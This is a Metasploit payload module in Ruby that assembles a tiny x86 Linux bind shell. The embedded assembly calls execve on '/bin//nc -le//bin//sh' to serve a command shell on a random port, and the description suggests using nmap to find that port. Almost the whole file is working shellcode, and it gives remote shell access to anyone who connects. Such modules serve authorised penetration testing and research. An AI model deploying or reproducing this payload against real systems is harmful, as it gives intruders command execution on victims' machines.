##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 44

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
      'Description'   => %q{
        The tiniest (46 bytes!) bind tcp shell in its class! Listen for a connection with a random port and spawn a command shell.
        Use nmap to discover the open port: 'nmap -sS -p- target'.
      },
      'Author'        => 'Aleh Boitsau <infosecurity[at]ya.ru>',
      'License'       => BSD_LICENSE,
      'References'    => ['URL', 'https://www.exploit-db.com/exploits/41631'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86
     ))

    def generate_bind_tcp_shell
      payload = <<-EOS
        
        preparation:
          xor edx, edx     ;zeroed edx
          push edx         ;push NULL into stack
          push 0x68732f2f  ;-le//bin//sh
          push 0x6e69622f
          push 0x2f656c2d
          mov edi, esp     ;store a pointer to -le//bin//sh into edi
          push edx         ;push NULL into stack
          push 0x636e2f2f  ;/bin//nc
          push 0x6e69622f
          mov ebx, esp     ;store a pointer to filename (/bin//nc) into ebx

        execve_call:
          push edx         ;push NULL into stack
          push edi         ;pointer to -le//bin//sh
          push ebx         ;pointer to filename (/bin//nc)		
          mov ecx, esp     ;argv[]
          xor eax, eax     ;zeroed eax
          mov al,11        ;define execve()
          int 0x80         ;run syscall
     EOS

     Metasm::Shellcode.assemble(Metasm::X86.new, payload).encode_string
    end
  end
end
